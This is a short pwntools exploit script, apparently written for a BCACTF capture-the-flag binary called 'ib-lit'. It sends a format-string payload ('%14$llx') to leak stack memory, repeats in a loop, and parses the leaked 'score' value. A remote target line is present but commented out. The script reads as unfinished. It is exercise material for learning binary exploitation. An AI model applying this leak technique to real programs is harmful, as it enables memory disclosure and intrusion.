from pwn import *

e = ELF("./ib-lit")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

while True:
  #p = remote("bin.bcactf.com", 49161)
  p = process(e.path)
  p.sendlineafter("fun??", "AAAAAAAAA%14$llx".ljust(0x30 - 2, "\x00"))

  print p.recvuntil("score:")
  val = p.recvline()
  print(val)
  val = int(val.strip()[:-1])

  print(val)

  print(p.recvall())
